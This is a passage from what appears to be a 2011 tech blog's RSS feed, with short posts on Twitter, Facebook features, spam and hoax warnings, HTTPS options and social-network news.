&lt;p&gt;Of course, you may remember the earlier reports that &lt;a href=&#34;http://www.cosmogeek.info/2011/02/twitter-suspends-ubertwitter-and.html&#34;&gt;UberMedia acquired TweetDeck&lt;/a&gt;. Niow, what happened? Read on..&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TcAL8ReussI/AAAAAAAAB9M/84EYD9u0Va0/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TcAL9NjioTI/AAAAAAAAB9Q/wNqHC6VVtrw/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;UberMedia had a 30 day exclusive on the deal, but negotiations took so long giving Twitter an opportunity to make a higher deal and Tweetdeck was in play again.&lt;/p&gt;
&lt;p&gt;Twitter do not allow UberMedia and other Twitter related startups to grow its market share. Twitter has said that it wants to control the consumer experience around the service, and is encouraging external developers to focus on something other than straightforward Twitter apps.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Do you suffer from Facebook Addiction Disorder?</title>
      <link>https://example.org/posts/2011-04-30-do-you-suffer-from-facebook-addiction-disorder/</link>
      <pubDate>Sat, 30 Apr 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-04-30-do-you-suffer-from-facebook-addiction-disorder/</guid>
      <description>&lt;p&gt;Many netizens are finding it harder and harder to stay away from social networking sites and experts have figures like around 350 million users suffer from &lt;strong&gt;Facebook Addiction Disorder (FAD).&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You won’t find FAD in any medical text book but this is true. More than half of Facebook’s total membership log on at least once in a day.&lt;/p&gt;
&lt;p&gt;You might be thinking that I don’t have FAD and this is all rubbish. “&lt;a href=&#34;http://www.allfacebook.com/do-you-suffer-from-facebook-addiction-disorder-2011-04&#34;&gt;AllFacebook&lt;/a&gt;” posted an interesting set of questions to examine whether you are &lt;strong&gt;Facebookaholic&lt;/strong&gt; -&lt;/p&gt;</description>
    </item>
    <item>
      <title>New Facebook Spam – America’s Got Talent Lady Video</title>
      <link>https://example.org/posts/2011-04-09-new-facebook-spam-americas-got-talent-lady-video/</link>
      <pubDate>Sat, 09 Apr 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-04-09-new-facebook-spam-americas-got-talent-lady-video/</guid>
      <description>&lt;p&gt;A new kind of ‘Click-Jacking’ and ‘Like-Jacking’ is spreading on Facebook. This time with a whole index of suggestive, funny and controversial videos.&lt;/p&gt;
&lt;p&gt;We have seen similar kind of Facebook &lt;a href=&#34;http://www.cosmogeek.info/2011/02/fb-spam-i-was-logged-into-facebook-for.html&#34;&gt;spams&lt;/a&gt; and &lt;a href=&#34;http://www.cosmogeek.info/2011/03/hoax-facebook-will-not-use-your-photos.html&#34;&gt;hoaxes&lt;/a&gt; in the past and &lt;a href=&#34;http://twitter.com/k_avinash&#34;&gt;cosmoGeek&lt;/a&gt; instantly alerted its readers &lt;a href=&#34;http://www.cosmogeek.info/2010/12/how-to-get-rid-of-facebook-360-images.html&#34;&gt;how to&lt;/a&gt; get rid from these kind of accidental clicks.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TaDkgsGYCJI/AAAAAAAAB6c/42hcoxNQNqk/s1600-h/image%5B13%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B12%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TaDkk_20JjI/AAAAAAAAB6o/2nVUbVWdZD4/image_thumb%5B6%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;A Lady smashed big cans of bear with her BIG BOOBS on America&amp;rsquo;s Got Talent, Checkout now!&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Once you click on the wall post link, you will be taken to a page displayed with a video link. Clicking play will hijack your account and you will be spreading the spam via your news feed.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google &#43;1 – Google’s version of Facebook ‘Like’</title>
      <link>https://example.org/posts/2011-03-31-google-1-googles-version-of-facebook-like/</link>
      <pubDate>Thu, 31 Mar 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-03-31-google-1-googles-version-of-facebook-like/</guid>
      <description>&lt;p&gt;Google today introduced  a new feature &lt;strong&gt;Google +1&lt;/strong&gt; which allows to share recommendations with the world right in Google’s search results. It is yet another attempt to make search more social.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TZSXbd6aLhI/AAAAAAAAB5U/tWf4LmUQEyw/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B8%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TZSXdlV1qjI/AAAAAAAAB5g/_8qxl0RvMm0/image_thumb%5B4%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This feature is slowly rolled out to Google.com, but you can try it by enabling the &lt;a href=&#34;http://www.google.com/experimental/index.html&#34;&gt;+1 search experiment&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>CloudGirlfriend.com – A Virtual Girlfriend on Facebook</title>
      <link>https://example.org/posts/2011-03-25-cloudgirlfriend-com-a-virtual-girlfriend-on-facebook/</link>
      <pubDate>Fri, 25 Mar 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-03-25-cloudgirlfriend-com-a-virtual-girlfriend-on-facebook/</guid>
      <description>&lt;p&gt;A startup is offering a virtual girl friend for you on Facebook! To make it look like you are not single, &lt;a href=&#34;http://cloudgirlfriend.com/jzfvs&#34;&gt;&lt;strong&gt;Cloud Girlfriend&lt;/strong&gt;&lt;/a&gt; promises to post things on your Facebook wall.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TYz3s0U-OdI/AAAAAAAAB48/6tlD7WHdhs0/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TYz3vYJraSI/AAAAAAAAB5A/GpRbahauUZ8/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The application yet not launched defines Cloud Girlfriend as “&lt;strong&gt;the social network girlfriend&lt;/strong&gt;” asking users for their email addresses to be notified. It claims -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Step 1: Define your perfect girlfriend.&lt;/p&gt;
&lt;p&gt;Step 2: We bring her into existence.&lt;/p&gt;
&lt;p&gt;Step 3: Connect and interact with her publicly on your favorite social network.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Hoax! Facebook Will Not Use Your Photos In Ads</title>
      <link>https://example.org/posts/2011-03-19-hoax-facebook-will-not-use-your-photos-in-ads/</link>
      <pubDate>Sat, 19 Mar 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-03-19-hoax-facebook-will-not-use-your-photos-in-ads/</guid>
      <description>&lt;p&gt;This rumor about Facebook using your photos in ads without your consent is spreading again. The rumor was not true earlier (back in 2009) and it is not true now.&lt;/p&gt;
&lt;p&gt;Many Facebook users are saying in a status message that’s being passed and worried that Facebook plans to use their photos in Facebook ads, and they&amp;rsquo;re telling everyone to change privacy settings to prevent it.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TYSJTwHXguI/AAAAAAAAB38/A4rngMI2wwg/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B7%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TYSJZZ-sEjI/AAAAAAAAB4I/gumCmoWF0Lw/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h6 id=&#34;_on-friday-facebook-will-start-using-your-photos-in-ads-that-appear-on-the-profile-page-of-your-friends-its-legal-and-mentioned-in-the-fine-print-when-you-create-your-account-to-stop-this-do-the-following-got-to-account-account-settings-click-on-facebook-ads-choose-no-one-in-both-drop-down-menus-scroll-down-for-2nd-and-save-changes-for-each-drop-down-please-copy-this-and-use-in-a-status-update_&#34;&gt;&lt;em&gt;On Friday, Facebook will start using your photos in ads that appear on the profile page of your friends. It&amp;rsquo;s legal and mentioned in the fine print when you create your account. To STOP this do the following: got to Account, Account Settings, click on Facebook Ads, choose &amp;ldquo;No one&amp;rdquo; in BOTH drop-down menus (scroll down for 2nd) and save changes for EACH drop-down. Please copy this and use in a status update.&lt;/em&gt;&lt;/h6&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let me start off by saying this rumor is &lt;strong&gt;FALSE&lt;/strong&gt;. Facebook has also &lt;a href=&#34;https://www.facebook.com/blog.php?post=110636457130&#34;&gt;confirmed&lt;/a&gt; it is false. It was initially started back in July 2009, and has more recently shot up again.&lt;/p&gt;</description>
    </item>
    <item>
      <title>After Facebook, Twitter Now Adds HTTPS Option</title>
      <link>https://example.org/posts/2011-03-16-after-facebook-twitter-now-adds-https-option/</link>
      <pubDate>Wed, 16 Mar 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-03-16-after-facebook-twitter-now-adds-https-option/</guid>
      <description>&lt;p&gt;Two months ago in January, the leading social networking site &lt;strong&gt;Facebook&lt;/strong&gt; introduced &lt;a href=&#34;http://www.cosmogeek.info/2011/01/facebook-introduced-social-captchas-and.html&#34;&gt;two new measures&lt;/a&gt; to gripe up security - a secured connection and Social Authentication. One of the important step to make it easier to manage the security is the &lt;strong&gt;HTTPS&lt;/strong&gt; option even while browsing.&lt;/p&gt;
&lt;p&gt;Today, the micro blogging site &lt;strong&gt;Twitter&lt;/strong&gt; finally &lt;a href=&#34;http://blog.twitter.com/2011/03/making-twitter-more-secure-https.html&#34;&gt;added&lt;/a&gt; optional permanent HTTPS setting.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TYDEC9jg2TI/AAAAAAAAB3s/4uPNC2EjBc4/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TYDED7MJ8EI/AAAAAAAAB3w/OYlSSDzU9Ok/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Using HTTPS for your Internet services is particularly important when using them over unsecured Wi-Fi connections.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Rolled Out New Commenting System</title>
      <link>https://example.org/posts/2011-03-02-facebook-rolled-out-new-commenting-system/</link>
      <pubDate>Wed, 02 Mar 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-03-02-facebook-rolled-out-new-commenting-system/</guid>
      <description>&lt;p&gt;Today, Facebook rolled out a new commenting system for blogs and third-party sites. It launched updates to the Comments Box Plugin with new moderation tools as well as features to improve the distribution and quality of comments on your site.&lt;/p&gt;
&lt;p&gt;According to a Facebook blog &lt;a href=&#34;https://developers.facebook.com/blog/post/472&#34;&gt;post&lt;/a&gt;, the new commenting system will be a quick install for publishers, with a single line of code. Sharing comments on Facebook will, of course, be seamless.&lt;/p&gt;</description>
    </item>
    <item>
      <title>‘The Social Network’ Won 3 Oscars Out of 8</title>
      <link>https://example.org/posts/2011-02-28-the-social-network-won-3-oscars-out-of-8/</link>
      <pubDate>Mon, 28 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-28-the-social-network-won-3-oscars-out-of-8/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.cosmogeek.info/2010/10/facebook-movie-social-network-releasing.html&#34;&gt;&lt;strong&gt;The Social Network&lt;/strong&gt;&lt;/a&gt; won only 3 Oscars out of eight awards it had been nominated for.&lt;/p&gt;
&lt;p&gt;Aaron Sorkin won best adapted screenplay, Trent Reznor and Atticus Ross won best soundtrack and Angus Wall and Kirk Baxter won best film editing.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Social Network&lt;/strong&gt; didn’t score on its nominations for direction, actor, supporting actor, sound editing nor best picture.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TWtX_lTjcOI/AAAAAAAAB04/FHiFS31FnoM/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TWtYAjzBz3I/AAAAAAAAB08/wuRk_T1Nxo8/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Social Network&lt;/strong&gt; is a movie about the founder of the most popular social network website ‘Facebook’. This movie with tag line “You don’t get to 500 million friends without making a few enemies” is directed by David Fincher and written by Aaron Sorkin.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Goodbye to Facebook ‘Share’ Button - ‘Like’ is the Future</title>
      <link>https://example.org/posts/2011-02-27-goodbye-to-facebook-share-button-like-is-the-future/</link>
      <pubDate>Sun, 27 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-27-goodbye-to-facebook-share-button-like-is-the-future/</guid>
      <description>&lt;p&gt;Say Goodbye to the Facebook ‘Share’ button, because the new functionality of ‘Like’ button is taking it over. Facebook is rolling out new functionality changes to the ‘Like’ button.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TWqUdKwkixI/AAAAAAAAB0o/dLF0qasGMA8/s1600-h/image%5B8%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B7%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TWqUggYZxOI/AAAAAAAAB00/Anfig1I6rQg/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Facebook is slowly rolling the update for Like button and has stopped developing the Share button. The company will continue to support the Share button but Like is the “recommended solution moving forward.”&lt;/p&gt;
&lt;p&gt;Currently, hitting just the ‘Like’ button on any site is not just working just like ‘Share’ button does. The new like button functionality is only showing up the users’ profile but not in the news feed unlike ‘Share’ button functionality. Hope, Facebook will add this update too.&lt;/p&gt;</description>
    </item>
    <item>
      <title>LinkedIn Blocked in China</title>
      <link>https://example.org/posts/2011-02-24-linkedin-blocked-in-china/</link>
      <pubDate>Thu, 24 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-24-linkedin-blocked-in-china/</guid>
      <description>&lt;p&gt;After the micro blogging site &lt;strong&gt;Twitter,&lt;/strong&gt; it appears that &lt;strong&gt;&lt;a href=&#34;http://www.linkedin.com/&#34;&gt;LinkedIn&lt;/a&gt;&lt;/strong&gt; is the latest victim of the anti-government protests in China. The Great Firewall (read China) now blocked the professional social networking site &lt;strong&gt;LinkedIn&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TWakhnWXwYI/AAAAAAAABzY/yIrq8smsoP8/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TWakjd3O4kI/AAAAAAAABzc/j78VzE74_wg/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The site had recently seen growth in China and was holding off the challenges of several clones like Ushi and Tianji. Protesters are moving from various social network sites, such as Twitter and LinkedIn, to organize protests.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter Restores Banned UberSocial and Twidroyd Apps</title>
      <link>https://example.org/posts/2011-02-22-twitter-restores-banned-ubersocial-and-twidroyd-apps/</link>
      <pubDate>Tue, 22 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-22-twitter-restores-banned-ubersocial-and-twidroyd-apps/</guid>
      <description>&lt;p&gt;After a dramatic turn of events earlier in the week of Twitter’s &lt;a href=&#34;http://www.cosmogeek.info/2011/02/twitter-suspends-ubertwitter-and.html&#34;&gt;suspension&lt;/a&gt; on UberMedia’s popular apps UberTwitter and twidroyd under the auspices of privacy, monetization and trademark violations; UberMedia has had its API access reinstated for at least two of its apps.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TWNQ9lycsrI/AAAAAAAAByw/_QKYeexijDw/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TWNQ-uaSaDI/AAAAAAAABy0/asCfpmTZ1Hk/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;From official Twitter &lt;a href=&#34;http://support.twitter.com/articles/452648-i-m-having-problems-logging-in-to-ubertwitter-or-twidroyd&#34;&gt;post&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;h5 id=&#34;update-2202011&#34;&gt;UPDATE 2/20/2011:&lt;/h5&gt;
&lt;p&gt;&lt;em&gt;We&amp;rsquo;ve given the developers of twidroyd and UberSocial for Blackberry (formerly UberTwitter) access to the Twitter API again. Our initial review indicates that steps have been taken to remedy the violations for these applications.&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter Suspends UberTwitter and twidroyd</title>
      <link>https://example.org/posts/2011-02-19-twitter-suspends-ubertwitter-and-twidroyd/</link>
      <pubDate>Sat, 19 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-19-twitter-suspends-ubertwitter-and-twidroyd/</guid>
      <description>&lt;p&gt;According to the official &lt;a href=&#34;http://support.twitter.com/articles/452648-i-m-having-problems-logging-in-to-ubertwitter-or-twidroyd&#34;&gt;post&lt;/a&gt; from Twitter, it has suspended &lt;strong&gt;UberTwitter&lt;/strong&gt; and &lt;strong&gt;Twidroyd&lt;/strong&gt; for violating its policies.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TWBDq0WphoI/AAAAAAAAByo/p-prIBK0VEo/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TWBDs31IiaI/AAAAAAAABys/PM9eZCAT8wc/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Summary of the post -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“&lt;em&gt;Regardless of how you access Twitter, we are dedicated to making Twitter better, faster and more reliable for you. As part of this effort, we ask applications that work with Twitter to abide by a simple set of rules that we believe are in the interests of our users, and the health and vitality of the Twitter platform as a whole. We often take actions to enforce these rules.&lt;br&gt;
We have suspended UberTwitter and twidroyd for violating our policies.&lt;br&gt;
Every day, we suspend hundreds of applications that are in violation of our policies. Generally, these apps are used by a small number of users. We are taking the unusual step of sharing this with you because today’s suspension may affect a larger number of users”&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To View Facebook Photos in the Classic Way</title>
      <link>https://example.org/posts/2011-02-18-how-to-view-facebook-photos-in-the-classic-way/</link>
      <pubDate>Fri, 18 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-18-how-to-view-facebook-photos-in-the-classic-way/</guid>
      <description>&lt;p&gt;Facebook recently rolled out the new Photo Viewer to everyone where you can browse more photos faster without having to lose your place in Facebook. Instead, the photo opens in the center of your screen, and you close it when you&amp;rsquo;re done. There&amp;rsquo;s no need to go back and forth between pages or reload the page.&lt;/p&gt;
&lt;p&gt;A new light box (the dark frame around your pictures) makes viewing photos a richer experience.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Phones: HTC announces Chacha and Salsa</title>
      <link>https://example.org/posts/2011-02-15-facebook-phones-htc-announces-chacha-and-salsa/</link>
      <pubDate>Tue, 15 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-15-facebook-phones-htc-announces-chacha-and-salsa/</guid>
      <description>&lt;p&gt;Mark Zuckerberg said it before: there will be no &lt;a href=&#34;http://www.cosmogeek.info/2010/09/facebook-we-are-not-building-phone.html&#34;&gt;Facebook phone&lt;/a&gt;. And now its clear what he meant – his strategy is to integrate Facebook into every phone telling us today at the HTC launch event in Barcelona.&lt;/p&gt;
&lt;p&gt;He also gave a sign with expectation of dozens of Facebook phones featuring deep social integration coming this year.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TVqHEvC1oDI/AAAAAAAAByE/R2JlZxpFhHM/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TVqHF-xVc2I/AAAAAAAAByI/AL_KI5qPedQ/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;HTC just made its Facebook phones official. Featuring a &lt;strong&gt;dedicated Facebook button&lt;/strong&gt;, HTC &lt;strong&gt;Chacha&lt;/strong&gt; and &lt;strong&gt;Salsa&lt;/strong&gt; will be available to customers globally starting in Q2 2011. Both these smartphones come a step up from Android 2.3 – 2.4, which is also called &lt;strong&gt;Gingerbread&lt;/strong&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Pages Are Getting An Upgrade</title>
      <link>https://example.org/posts/2011-02-11-facebook-pages-are-getting-an-upgrade/</link>
      <pubDate>Fri, 11 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-11-facebook-pages-are-getting-an-upgrade/</guid>
      <description>&lt;p&gt;Many of our friends administer one or more pages on Facebook, but there is one essential feature Facebook &amp;ldquo;forgot&amp;rdquo; to make - the option to get email alerts when somebody posts or comments on one of your pages.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TVTousRkfJI/AAAAAAAABxc/tfOKa97itz8/s1600-h/image%5B7%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TVTovnm_mlI/AAAAAAAABxg/f01gb_swUgM/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now, Facebook pages are getting an updated layout and several new features to help you engage with your fans more effectively. Here&amp;rsquo;s some of what you&amp;rsquo;ll be getting:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Notifications when fans interact with your page or posts&lt;/li&gt;
&lt;li&gt;A place to showcase photos along the top of your page&lt;/li&gt;
&lt;li&gt;A news feed for your page&lt;/li&gt;
&lt;li&gt;The ability to Like and post on other pages as your page&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>FB Spam: I was logged into Facebook for XXX hours in 2010</title>
      <link>https://example.org/posts/2011-02-06-fb-spam-i-was-logged-into-facebook-for-xxx-hours-in-2010/</link>
      <pubDate>Sun, 06 Feb 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-02-06-fb-spam-i-was-logged-into-facebook-for-xxx-hours-in-2010/</guid>
      <description>&lt;p&gt;Spam messages are spreading across Facebook claiming to be from users who have calculated the total hours they spent on the social network during 2010.&lt;/p&gt;
&lt;p&gt;Would you be tempted to find out how long &lt;em&gt;you&lt;/em&gt; had spent on Facebook in the last year? Well, I would be cautious if I were you as you could find yourself assisting scammers who are using rogue applications to make themselves a quick buck. I’ve instantly alerted its members about these kind of spams in the &lt;a href=&#34;http://www.cosmogeek.info/2010/12/how-to-get-rid-of-facebook-360-images.html&#34;&gt;past&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Introduced Social Captchas and HTTPS</title>
      <link>https://example.org/posts/2011-01-26-facebook-introduced-social-captchas-and-https/</link>
      <pubDate>Wed, 26 Jan 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-01-26-facebook-introduced-social-captchas-and-https/</guid>
      <description>&lt;p&gt;Facebook is introducing two new measures to gripe up security – a secured connection and Social Authentication. These features are especially useful when you&amp;rsquo;re uncertain whether your network or computer is secure.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TUB2Wgzf7XI/AAAAAAAABu4/-3O3O6mK0xY/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TUB2YPHRrwI/AAAAAAAABu8/Aht8fASCkiA/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A Secured Connection –&lt;/strong&gt; Facebook currently uses HTTPS only when your password is sent, but today it is expanding its usage in order to help keep your data even more secure.You will now have the ability to experience Facebook entirely over HTTPS. You should consider enabling this option if you frequently use Facebook from public Internet access points found at coffee shops, airports, libraries or schools. You can enable this option under advanced security features from ‘Account Security’ section.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Zuckerberg&#39;s Fan Page Hacked</title>
      <link>https://example.org/posts/2011-01-26-zuckerbergs-fan-page-hacked/</link>
      <pubDate>Wed, 26 Jan 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-01-26-zuckerbergs-fan-page-hacked/</guid>
      <description>&lt;p&gt;According to TechCrunch, a prominent Facebook fan page has been hacked, defaced and as a result closed now!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TT_eVJaIHWI/AAAAAAAABuo/c8To5nbUlKA/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B9%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TT_ef6ThtBI/AAAAAAAABu0/wDEzCqmyRK0/image_thumb%5B5%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Obviously, Zuckerberg didn’t actually write it. Within hours of the comment&amp;rsquo;s appearance, Zuckerberg&amp;rsquo;s &lt;a href=&#34;http://www.facebook.com/MarkZuckerberg&#34;&gt;fan page&lt;/a&gt; disappeared completely from the Facebook network.&lt;/p&gt;
&lt;p&gt;Following this Mark’s fan page hack, do you still trust Facebook with your online persona?&lt;/p&gt;</description>
    </item>
    <item>
      <title>Chit Chat: Facebook Instant Chat Messenger</title>
      <link>https://example.org/posts/2010-12-22-chit-chat-facebook-instant-chat-messenger/</link>
      <pubDate>Wed, 22 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-22-chit-chat-facebook-instant-chat-messenger/</guid>
      <description>&lt;p&gt;Bored of using Facebook’s chat in your browser? For those of you who use Facebook’s built in IM as your primary choice, you would love to try out &lt;strong&gt;Chit Chat.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TRHpozFlOvI/AAAAAAAABr0/dvdBr3P6ryc/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TRHpp7UfxRI/AAAAAAAABr4/dJma3Ndx6WE/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.chitchat.org.uk/&#34;&gt;Chit Chat&lt;/a&gt; is a popular desktop Facebook Chat Instant Messenger that supports chat history, text formatting, emoticons and plenty of other features.&lt;br&gt;
It is a convenient and fun way to chat with your Facebook contacts without the hassle of surfing Facebook. It also supports tabbed message windows interface.&lt;br&gt;
At present Chit Chat for Facebook only supports Microsoft Windows and it is not compatible on Mac and mobile platform devices.&lt;br&gt;
